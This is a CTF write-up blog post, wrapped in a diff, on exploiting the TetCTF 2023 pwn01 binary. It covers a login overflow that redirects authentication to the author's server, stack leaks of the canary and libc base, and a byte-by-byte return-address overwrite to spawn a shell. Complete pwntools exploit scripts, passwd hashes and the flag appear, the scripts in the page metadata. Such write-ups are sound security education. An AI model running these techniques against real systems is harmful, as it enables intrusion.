@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TetCTF 2023: pwn01 | Black Bauhinia</title>
+
+<meta name="keywords" content="ctf" />
+<meta name="description" content="I did not solve it in time (30 minutes late T.T). However, I spent quite of lot of time on this challenge, so I might as well do a write up. Special thanks to Mystiz, fsharp, cire meat pop for helping me on this challenge.">
+<meta name="author" content="Viky">
+<link rel="canonical" href="https://b6a.black/posts/2023-01-09-tetctf-pwn01/" />
+<link href="/assets/css/stylesheet.min.79c4dfee3993cd3110886e38d36a5106e0d6922344cefa3ff5c0076f246815f0.css" integrity="sha256-ecTf7jmTzTEQiG4402pRBuDWkiNEzvo/9cAHbyRoFfA=" rel="preload stylesheet"
+    as="style">
+
+<link rel="icon" href="https://b6a.black/favicon.ico">
+
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.91.0" />
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-M67YZZ2MP1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-M67YZZ2MP1');
+</script>
+
+
+
+<script src="https://kit.fontawesome.com/fbbadced05.js" crossorigin="anonymous"></script>
+
+
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Recursive&display=swap" rel="stylesheet"> 
+
+
+<meta property="og:title" content="TetCTF 2023: pwn01" />
+<meta property="og:description" content="I did not solve it in time (30 minutes late T.T). However, I spent quite of lot of time on this challenge, so I might as well do a write up. Special thanks to Mystiz, fsharp, cire meat pop for helping me on this challenge." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://b6a.black/posts/2023-01-09-tetctf-pwn01/" />
+<meta property="og:image" content="https://b6a.black/images/2023-01-09-tetctf/too-much-to-read.jpg" /><meta property="article:published_time" content="2023-01-09T23:55:00+08:00" />
+<meta property="article:modified_time" content="2023-01-09T23:55:00+08:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://b6a.black/images/2023-01-09-tetctf/too-much-to-read.jpg" />
+<meta name="twitter:title" content="TetCTF 2023: pwn01"/>
+<meta name="twitter:description" content="I did not solve it in time (30 minutes late T.T). However, I spent quite of lot of time on this challenge, so I might as well do a write up. Special thanks to Mystiz, fsharp, cire meat pop for helping me on this challenge."/>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TetCTF 2023: pwn01",
+  "name": "TetCTF 2023: pwn01",
+  "description": "I did not solve it in time (30 minutes late T.T). However, I spent quite of lot of time on this challenge, so I might as well do a write up. Special thanks to Mystiz, fsharp, cire …",
+  "keywords": [
+    "ctf"
+  ],
+  "articleBody": "Challenge description  I did not solve it in time (30 minutes late T.T). However, I spent quite of lot of time on this challenge, so I might as well do a write up. Special thanks to Mystiz, fsharp, cire meat pop for helping me on this challenge.\nReverse engineering The provided binary will connect to a remote authentication server which provides the user/password\nThe original authentication server is hosting on 139.162.36.205 6666 and gives the folloing response when connected.\nroot:$6$tet$.84DBkpbpZEcXF.WKDJJDSStwXYJir3.WSKOma1e5N20d4SDpbMPLryTcZaB7buisGAsT2GW1bdad74Hh3Ply0:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false phieulang:$6$tet$c6Gn4JRQYto4qK3o0nx.iF04g9XaR0bceVJmyjFqVplnSCkZKPJSz30tfvKbu/mNHPHC/kJdtSELbfHzRchTN.:1000:1000:,,,:/home/phieulang:/usr/bin/zsh mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin Hash cracking? Not this way.\nAfter login, we could have access to read file function. There are 5 files and the content of the first 4 files are constant, and seems to be dumped from /dev/urandom. The fifth file is urandom.\nVulnerbility Analysis Bypass the login There is a buffer overflow in the login function. See the pseudo-code from ghidra.\nvoid login(void) { ssize_t readResult; long in_FS_OFFSET; char continueLogin; int readSize; int sockFd; char *serverIp; char *usernameBuffer; char *passwordBuffer; int *loginResult; char *authToken; char password [128]; char username [128]; int authData [2]; char acStack80 [8]; undefined authPacket [56]; long canary; canary = *(long *)(in_FS_OFFSET + 0x28); serverIp = \"tet.ctf\"; usernameBuffer = username; passwordBuffer = password; loginResult = authData; authData[0] = 0; authToken = acStack80; do { memset(authPacket,0,0x10); getServerIp(serverIp,authToken); printf(\"Username: \"); readResult = read(0,usernameBuffer,0xb0); readSize = (int)readResult; Here is an illustration.\n So we can control variables on stack, one of them is the authentication server IP. Like this.\n To host my own authentication server, I have compiled the following c code and used socat to serve the binary. The server needs to be accessible from the internet at port 6666. The credential is simply just root:P@ssw0rd.\n#include  int main(void) { printf(\"root:$y$j9T$Jh.SJVlEpZJ4VjpG7xQqI/$Ddq3Nf1sbgyS91Hy.6jhv88/gz5al3p830zEFjFWrt0:0:0:root:/root:/bin/bash\\n\"); return 0; } socat tcp-l:6666,reuseaddr,fork EXEC:\"./a.out\",pty,stderr\nAfter that, we could login as root. We now have access to the read file function.\nRead file feature There is a buffer overflow in the read file function. See the pseudo-code from ghidra.\nchar readBuffer [264]; //...snip... while (true) { printf(\"How many bytes to read?\"); lVar1 = getNumber(); size = (int)lVar1; if (size == -1) break; memset(readBuffer,0,0x100); sVar2 = read(ret_val3,readBuffer,(long)size); if (sVar2 == 0) { puts(\"No more data!\"); break; } puts(readBuffer); } Read premise We can corrupt the stack by specifying a read size larger than the buffer size.\nSince the readBuffer would be passed to the function puts, we can specify a specific size such that it would leak values on stack as the puts function would print until null byte was reached. We could leak the canary and libc base with this function.\nWrite premise The function call read(ret_val3,readBuffer,(long)size); would read from the selected file and write to the readBuffer with the specified size. Let say we know the data inside the file on the challenge server, we can achieve write to stack by writing from the furthest address . Basically find how far is the target byte in the file based on the current reading index. Do some math to skip to the correct reading index. Read the wanted offset to write the byte to stack. Simple? See the following implementation and see how to write a target byte into a specific offset from readBuffer.\ndef writeByte(p, targetByte, offset): global read_index log.info(f\"writeByte() targetByte : {hex(targetByte)}offset : {offset}read_index : {read_index}\") with open('./data/file.bin','rb') as fp: fp.seek(read_index) data = fp.read() distance = data[offset:].index(targetByte) + 1 + offset idx = distance - offset skip_count = idx//BUF_SIZE final_read_size = idx%BUF_SIZE for i in range(skip_count): p.sendlineafter(b\"read?\",f\"{BUF_SIZE}\".encode()) p.sendlineafter(b\"read?\",f\"{final_read_size}\".encode()) p.sendlineafter(b\"read?\",f\"{offset}\".encode()) read_index += distance Exploitation Since we have both read and write premise, we could achieve code execution by overwriting the return address. Use one_gadget to find a decent gadget and try to satisfy the conditions. Dont forget to fix the canary when you leave the read file function.\nHere is a nice screenshot.\n TetCTF{w4rm_uP_ch4lL3ng3__g0Od_g4m3!}\nSolve script This script is used to dump file 1 on the challenge server:\nfrom pwn import * read_index = 0 bytes_to_read = 264 sleep_secs = 2 question = b\"How many bytes to read?\" file_index = 1 with open(\"./data/file.bin\",'rb') as fp: old_data = fp.read(read_index) with open(\"./data/file.bin\",'wb') as fp: fp.write(old_data) while True: print(f'Reconnect read_index : {read_index}') p = remote(\"139.162.36.205\", 31337) p.sendlineafter(b\"Your choice: \", b\"1\") p.sendlineafter(b\"Username: \", b\"root\\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa198.199.78.86\") p.sendlineafter(b\"Password: \", b\"P@ssw0rd\") p.sendlineafter(b\"Your choice: \", b\"2\") p.sendlineafter(b\"Enter the index of the file to read: \", str(file_index).encode()) try: if read_index == 0: p.sendlineafter(question, str(bytes_to_read).encode()) else: steps = read_index // bytes_to_read off = read_index % bytes_to_read for i in range(steps): p.sendlineafter(question, str(bytes_to_read).encode()) if off != 0: p.sendlineafter(question, str(off).encode()) p.sendlineafter(question, str(bytes_to_read).encode()) a = p.recv(bytes_to_read) print(f\"{a}\") if(len(a)  bytes_to_read): read_index += len(a) + 1 a += b'\\x00' else: read_index += len(a) fp.write(a) p.close() if read_index  20000: break except Exception as e: print(f'Error {e}') p.close() continue from pwn import * import binascii context.log_level = \"info\" # 0x50a37 posix_spawn(rsp+0x1c, \"/bin/sh\", 0, rbp, rsp+0x60, environ) # constraints: # rsp \u0026 0xf == 0 # rcx == NULL # rbp == NULL || (u16)[rbp] == NULL # 0xebcf1 execve(\"/bin/sh\", r10, [rbp-0x70]) # constraints: # address rbp-0x78 is writable # [r10] == NULL || r10 == NULL # [[rbp-0x70]] == NULL || [rbp-0x70] == NULL # 0xebcf5 execve(\"/bin/sh\", r10, rdx) # constraints: # address rbp-0x78 is writable # [r10] == NULL || r10 == NULL # [rdx] == NULL || rdx == NULL # 0xebcf8 execve(\"/bin/sh\", rsi, rdx) # constraints: # address rbp-0x78 is writable # [rsi] == NULL || rsi == NULL # [rdx] == NULL || rdx == NULL read_index = 0 BUF_SIZE = 264 def readFile(p, idx): p.sendlineafter(b\"Your choice:\",b\"2\") p.sendlineafter(b\"Enter the index of the file to read:\",f\"{idx}\".encode()) def readBytes(p, size, readSize): global read_index try: with open('./data/file.bin','rb') as fp: fp.seek(read_index) data = fp.read() p.sendlineafter(b\"read?\",f\"{size}\".encode()) log.debug(f'DUMP: {binascii.hexlify(data[:size])}') tmp = p.recv(readSize) read_index += size while(len(tmp)  readSize): log.debug(f\"readBytes read {readSize}got {len(tmp)}\") p.send(f'{size}'.encode()) log.debug(f'DUMP: {binascii.hexlify(data[:size])}') tmp = p.recv(readSize) read_index += size return tmp except Exception as e: log.debug(f\"readByte error {e}\") def writeByte(p, targetByte, offset): global read_index log.info(f\"writeByte() targetByte : {hex(targetByte)}offset : {offset}read_index : {read_index}\") with open('./data/file.bin','rb') as fp: fp.seek(read_index) data = fp.read() distance = data[offset:].index(targetByte) + 1 + offset #Look for target Byte that is at least offset away from start. Off by 1 idx = distance - offset skip_count = idx//BUF_SIZE final_read_size = idx%BUF_SIZE log.debug(f\"distance : {distance}idx : {idx}skip_count : {skip_count}final_read_size : {final_read_size}\") for i in range(skip_count): p.sendlineafter(b\"read?\",f\"{BUF_SIZE}\".encode()) log.debug(f'DUMP: {binascii.hexlify(data[BUF_SIZE*i:BUF_SIZE*i+BUF_SIZE])}') if not final_read_size == 0: p.sendlineafter(b\"read?\",f\"{final_read_size}\".encode()) log.debug(f'DUMP: {binascii.hexlify(data[BUF_SIZE*skip_count:BUF_SIZE*skip_count+final_read_size])}') p.sendlineafter(b\"read?\",f\"{offset}\".encode()) log.debug(f'DUMP: {binascii.hexlify(data[BUF_SIZE*skip_count+final_read_size:BUF_SIZE*skip_count+final_read_size+offset])}') read_index += distance function_offset = 0x7feedf585d90 - 0x007feedf55c000 # p = process('./chall') # gdb.attach(p) p = remote(\"139.162.36.205\",31337) #Login p.sendlineafter(b\"Your choice:\",b\"1\") p.sendlineafter(b\"Username:\",b\"root\\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa198.199.78.86\") p.sendlineafter(b\"Password:\",b\"P@ssw0rd\") readFile(p, 1) # Get canary offset_canary = BUF_SIZE+1 leak = readBytes(p,offset_canary, offset_canary+7) canary = u64(b'\\x00'+ leak[offset_canary:offset_canary+7]) log.info(f\"canary : {hex(canary)}\") # Get libc_base offset_functon = BUF_SIZE+32 leak = readBytes(p,offset_functon, offset_functon+6) function_leak = u64(leak[offset_functon:offset_functon+6] + b'\\x00\\x00') #__libc_start_call_main+128 log.info(f\"__libc_start_call_main+128 : {hex(function_leak)}\") libc_base = function_leak - function_offset log.info(f\"libc_base base : {hex(libc_base)}\") #Calculate gadget address gadget = 0x50a37 + libc_base # gadget = 0x616161616161 log.info(f\"one gadget : {hex(gadget)}\") #Rewrite return address return_offset = BUF_SIZE+16 for idx,byte in zip(range(return_offset+8,return_offset,-1),p64(gadget)[::-1]): writeByte(p,byte,idx) #Rewrite rbp rbp_offset = BUF_SIZE + 8 for idx,byte in zip(range(rbp_offset+8,rbp_offset,-1),p64(0)[::-1]): writeByte(p,byte,idx) #Rewrite canary for idx,byte in zip(range(BUF_SIZE+8,BUF_SIZE,-1),p64(canary)[::-1]): writeByte(p,byte,idx) # Input 0 and enter to trigger the return p.interactive() ",
+  "wordCount" : "1217",
+  "inLanguage": "en",
+  "image":"https://b6a.black/images/2023-01-09-tetctf/too-much-to-read.jpg","datePublished": "2023-01-09T23:55:00+08:00",
+  "dateModified": "2023-01-09T23:55:00+08:00",
+  "author":[{
+    "@type": "Person",
+    "name": "Viky"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://b6a.black/posts/2023-01-09-tetctf-pwn01/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Black Bauhinia",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://b6a.black/favicon.ico"
+    }
+  }
+}
+</script>
+
+
+
+</head>
+
+<body class=" dark" id="top">
+<noscript>
+    <style type="text/css">
+        .theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://b6a.black/" accesskey="h" title="Black Bauhinia (Alt + H)">Black Bauhinia</a>
+            <span class="logo-switches">
+                
+                
+            </span>
+        </div>
+        <ul id="menu" onscroll="menu_on_scroll()">
+            <li>
+                <a href="https://b6a.black/about-us/" title="About Us">
+                    <span>About Us</span>
+                </a>
+            </li></ul>
+    </nav>
+</header>
+
+    <main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+
+    <h1 class="post-title">
+      TetCTF 2023: pwn01
+    </h1>
+    <div class="post-meta">
+
+January 9, 2023&nbsp;·&nbsp;Viky
+
+</div>
+  </header>
+  
+  
+  <div class="post-content js-toc-content">
+<h2 id="challenge-description">Challenge description<a hidden class="anchor" aria-hidden="true" href="#challenge-description">#</a></h2>
+
+  <figure class="center" >
+    <img src="/images/2023-01-09-tetctf/description.png"   />
+    
+  </figure>
+
+
+<p>I did not solve it in time (30 minutes late T.T). However, I spent quite of lot of time on this challenge, so I might as well do a write up. Special thanks to <em>Mystiz</em>, <em>fsharp</em>, <em>cire meat pop</em> for helping me on this challenge.</p>
+<h2 id="reverse-engineering">Reverse engineering<a hidden class="anchor" aria-hidden="true" href="#reverse-engineering">#</a></h2>
+<p>The provided binary will connect to a remote authentication server which provides the user/password</p>
+<p>The original authentication server is hosting on <code>139.162.36.205 6666</code> and gives the folloing response when connected.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">root:$6$tet$.84DBkpbpZEcXF.WKDJJDSStwXYJir3.WSKOma1e5N20d4SDpbMPLryTcZaB7buisGAsT2GW1bdad74Hh3Ply0:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+phieulang:$6$tet$c6Gn4JRQYto4qK3o0nx.iF04g9XaR0bceVJmyjFqVplnSCkZKPJSz30tfvKbu/mNHPHC/kJdtSELbfHzRchTN.:1000:1000:,,,:/home/phieulang:/usr/bin/zsh
+mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
+dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</code></pre></div><p>Hash cracking? Not this way.</p>
+<p>After login, we could have access to read file function. There are 5 files and the content of the first 4 files are constant, and seems to be dumped from <code>/dev/urandom</code>. The fifth file is <code>urandom</code>.</p>
+<h2 id="vulnerbility-analysis">Vulnerbility Analysis<a hidden class="anchor" aria-hidden="true" href="#vulnerbility-analysis">#</a></h2>
+<h3 id="bypass-the-login">Bypass the login<a hidden class="anchor" aria-hidden="true" href="#bypass-the-login">#</a></h3>
+<p>There is a buffer overflow in the login function. See the pseudo-code from ghidra.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">login</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  ssize_t readResult;
+  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+  <span style="color:#66d9ef">char</span> continueLogin;
+  <span style="color:#66d9ef">int</span> readSize;
+  <span style="color:#66d9ef">int</span> sockFd;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>serverIp;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>usernameBuffer;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>passwordBuffer;
+  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>loginResult;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>authToken;
+  <span style="color:#66d9ef">char</span> password [<span style="color:#ae81ff">128</span>];
+  <span style="color:#66d9ef">char</span> username [<span style="color:#ae81ff">128</span>];
+  <span style="color:#66d9ef">int</span> authData [<span style="color:#ae81ff">2</span>];
+  <span style="color:#66d9ef">char</span> acStack80 [<span style="color:#ae81ff">8</span>];
+  undefined authPacket [<span style="color:#ae81ff">56</span>];
+  <span style="color:#66d9ef">long</span> canary;
+  
+  canary <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+  serverIp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;tet.ctf&#34;</span>;
+  usernameBuffer <span style="color:#f92672">=</span> username;
+  passwordBuffer <span style="color:#f92672">=</span> password;
+  loginResult <span style="color:#f92672">=</span> authData;
+  authData[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  authToken <span style="color:#f92672">=</span> acStack80;
+  <span style="color:#66d9ef">do</span> {
+    memset(authPacket,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x10</span>);
+    getServerIp(serverIp,authToken);
+    printf(<span style="color:#e6db74">&#34;Username: &#34;</span>);
+    readResult <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>,usernameBuffer,<span style="color:#ae81ff">0xb0</span>);
+    readSize <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)readResult;
+</code></pre></div><p>Here is an illustration.</p>
+
+  <figure class="center" >
+    <img src="/images/2023-01-09-tetctf/too-much-to-read.jpg"   />
+    
+  </figure>
+
+
+<p>So we can control variables on stack, one of them is the authentication server IP. Like this.</p>
+
+  <figure class="center" >
+    <img src="/images/2023-01-09-tetctf/overwriting-server-ip.png"   />
+    
+  </figure>
+
+
+<p>To host my own authentication server, I have compiled the following c code and used socat to serve the binary. The server needs to be accessible from the internet at port 6666. The credential is simply just <code>root:P@ssw0rd</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
+    printf(<span style="color:#e6db74">&#34;root:$y$j9T$Jh.SJVlEpZJ4VjpG7xQqI/$Ddq3Nf1sbgyS91Hy.6jhv88/gz5al3p830zEFjFWrt0:0:0:root:/root:/bin/bash</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p><code>socat tcp-l:6666,reuseaddr,fork EXEC:&quot;./a.out&quot;,pty,stderr</code></p>
+<p>After that, we could login as root. We now have access to the read file function.</p>
+<h3 id="read-file-feature">Read file feature<a hidden class="anchor" aria-hidden="true" href="#read-file-feature">#</a></h3>
+<p>There is a buffer overflow in the read file function. See the pseudo-code from ghidra.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">char</span> readBuffer [<span style="color:#ae81ff">264</span>];
+<span style="color:#75715e">//...snip...
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">while</span> (true) {
+    printf(<span style="color:#e6db74">&#34;How many bytes to read?&#34;</span>);
+    lVar1 <span style="color:#f92672">=</span> getNumber();
+    size <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)lVar1;
+    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">break</span>;
+    memset(readBuffer,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x100</span>);
+    sVar2 <span style="color:#f92672">=</span> read(ret_val3,readBuffer,(<span style="color:#66d9ef">long</span>)size);
+    <span style="color:#66d9ef">if</span> (sVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+        puts(<span style="color:#e6db74">&#34;No more data!&#34;</span>);
+        <span style="color:#66d9ef">break</span>;
+    }
+    puts(readBuffer);
+}
+</code></pre></div><h4 id="read-premise">Read premise<a hidden class="anchor" aria-hidden="true" href="#read-premise">#</a></h4>
+<p>We can corrupt the stack by specifying a read size larger than the buffer size.</p>
+<p>Since the <code>readBuffer</code> would be passed to the function <code>puts</code>, we can specify a specific size such that it would leak values on stack as the <code>puts</code> function would print until null byte was reached. We could leak the canary and libc base with this function.</p>
+<h4 id="write-premise">Write premise<a hidden class="anchor" aria-hidden="true" href="#write-premise">#</a></h4>
+<p>The function call <code>read(ret_val3,readBuffer,(long)size);</code> would read from the selected file and write to the readBuffer with the specified size. Let say we know the data inside the file on the challenge server, we can achieve write to stack by writing from the furthest address . Basically find how far is the target byte in the file based on the current reading index. Do some math to skip to the correct reading index. Read the wanted offset to write the byte to stack. Simple? See the following implementation and see how to write a target byte into a specific offset from <code>readBuffer</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">writeByte</span>(p, targetByte, offset):
+    <span style="color:#66d9ef">global</span> read_index
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;writeByte() targetByte : </span><span style="color:#e6db74">{</span>hex(targetByte)<span style="color:#e6db74">}</span><span style="color:#e6db74"> offset : </span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74"> read_index : </span><span style="color:#e6db74">{</span>read_index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./data/file.bin&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> fp:
+        fp<span style="color:#f92672">.</span>seek(read_index)
+        data <span style="color:#f92672">=</span> fp<span style="color:#f92672">.</span>read()
+    distance <span style="color:#f92672">=</span> data[offset:]<span style="color:#f92672">.</span>index(targetByte) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> offset
+    idx <span style="color:#f92672">=</span> distance <span style="color:#f92672">-</span> offset
+    skip_count <span style="color:#f92672">=</span> idx<span style="color:#f92672">//</span>BUF_SIZE
+    final_read_size <span style="color:#f92672">=</span> idx<span style="color:#f92672">%</span>BUF_SIZE
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(skip_count):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;read?&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BUF_SIZE<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;read?&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>final_read_size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;read?&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+    read_index <span style="color:#f92672">+=</span> distance
+</code></pre></div><h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
+<p>Since we have both read and write premise, we could achieve code execution by overwriting the return address. Use <a href="https://github.com/david942j/one_gadget">one_gadget</a> to find a decent gadget and try to satisfy the conditions. Dont forget to fix the canary when you leave the read file function.</p>
+<p>Here is a nice screenshot.</p>
+
+  <figure class="center" >
+    <img src="/images/2023-01-09-tetctf/shell.png"   />
+    
+  </figure>
+
+
+<p><code>TetCTF{w4rm_uP_ch4lL3ng3__g0Od_g4m3!}</code></p>
+<h2 id="solve-script">Solve script<a hidden class="anchor" aria-hidden="true" href="#solve-script">#</a></h2>
